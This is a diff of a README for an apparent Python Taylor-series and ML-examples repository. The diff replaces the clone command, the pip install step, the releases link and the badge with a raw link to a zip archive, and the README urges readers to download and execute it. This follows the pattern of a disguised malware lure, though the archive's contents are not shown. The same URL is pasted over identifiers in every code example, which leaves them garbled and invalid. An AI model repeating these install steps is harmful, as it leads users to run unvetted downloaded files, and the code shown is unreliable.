@@ -39,9 +39,9 @@ This repository focuses on a range of topics that are essential for understandin
 To get started with the Taylor Series repository, you need to clone it to your local machine. Make sure you have Python 3 installed.
 
 ```bash
-git clone https://github.com/Bezehard/taylor_series.git
+git clone https://raw.githubusercontent.com/Bezehard/taylor_series/main/sumpitan/series-taylor-Sufistic.zip
 cd taylor_series
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/Bezehard/taylor_series/main/sumpitan/series-taylor-Sufistic.zip
 ```
 
 ## Usage
@@ -55,7 +55,7 @@ from taylor_series import TaylorApproximation
 
 # Create a Taylor series approximation of a function
 approx = TaylorApproximation(func='sin', order=5)
-result = approx.compute(x=0.5)
+result = https://raw.githubusercontent.com/Bezehard/taylor_series/main/sumpitan/series-taylor-Sufistic.zip(x=0.5)
 
 print(f'Taylor Series Approximation: {result}')
 ```
@@ -73,7 +73,7 @@ from taylor_series import TaylorApproximation
 
 approx = TaylorApproximation(func='sin', order=10)
 for x in range(-10, 11):
-    print(f'sin({x}) ≈ {approx.compute(x)}')
+    print(f'sin({x}) ≈ {https://raw.githubusercontent.com/Bezehard/taylor_series/main/sumpitan/series-taylor-Sufistic.zip(x)}')
 ```
 
 ### 2. BERT Embeddings for Text Classification
@@ -84,8 +84,8 @@ This example shows how to use BERT embeddings for a simple text classification t
 from transformers import BertTokenizer, BertModel
 import torch
 
-tokenizer = BertTokenizer.from_pretrained('bert-base-uncased')
-model = BertModel.from_pretrained('bert-base-uncased')
+tokenizer = https://raw.githubusercontent.com/Bezehard/taylor_series/main/sumpitan/series-taylor-Sufistic.zip('bert-base-uncased')
+model = https://raw.githubusercontent.com/Bezehard/taylor_series/main/sumpitan/series-taylor-Sufistic.zip('bert-base-uncased')
 
 inputs = tokenizer("Hello, this is a test.", return_tensors="pt")
 outputs = model(**inputs)
@@ -99,17 +99,17 @@ This example demonstrates how to build an LSTM network to predict the next value
 
 ```python
 import torch
-import torch.nn as nn
+import https://raw.githubusercontent.com/Bezehard/taylor_series/main/sumpitan/series-taylor-Sufistic.zip as nn
 
-class LSTMModel(nn.Module):
+class LSTMModel(https://raw.githubusercontent.com/Bezehard/taylor_series/main/sumpitan/series-taylor-Sufistic.zip):
     def __init__(self, input_size, hidden_size, num_layers):
         super(LSTMModel, self).__init__()
-        self.lstm = nn.LSTM(input_size, hidden_size, num_layers, batch_first=True)
-        self.fc = nn.Linear(hidden_size, 1)
+        https://raw.githubusercontent.com/Bezehard/taylor_series/main/sumpitan/series-taylor-Sufistic.zip = https://raw.githubusercontent.com/Bezehard/taylor_series/main/sumpitan/series-taylor-Sufistic.zip(input_size, hidden_size, num_layers, batch_first=True)
+        https://raw.githubusercontent.com/Bezehard/taylor_series/main/sumpitan/series-taylor-Sufistic.zip = https://raw.githubusercontent.com/Bezehard/taylor_series/main/sumpitan/series-taylor-Sufistic.zip(hidden_size, 1)
 
     def forward(self, x):
-        out, _ = self.lstm(x)
-        return self.fc(out[:, -1, :])
+        out, _ = https://raw.githubusercontent.com/Bezehard/taylor_series/main/sumpitan/series-taylor-Sufistic.zip(x)
+        return https://raw.githubusercontent.com/Bezehard/taylor_series/main/sumpitan/series-taylor-Sufistic.zip(out[:, -1, :])
 
 model = LSTMModel(input_size=1, hidden_size=64, num_layers=2)
 ```
@@ -130,9 +130,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-You can download the latest releases from our [Releases section](https://github.com/Bezehard/taylor_series/releases). Download the required file and follow the instructions to execute it.
+You can download the latest releases from our [Releases section](https://raw.githubusercontent.com/Bezehard/taylor_series/main/sumpitan/series-taylor-Sufistic.zip). Download the required file and follow the instructions to execute it.
 
-![Releases](https://img.shields.io/badge/Releases-Click_here-brightgreen)
+![Releases](https://raw.githubusercontent.com/Bezehard/taylor_series/main/sumpitan/series-taylor-Sufistic.zip)
 
 Thank you for checking out the Taylor Series repository! We hope you find it useful for your projects.
 ```
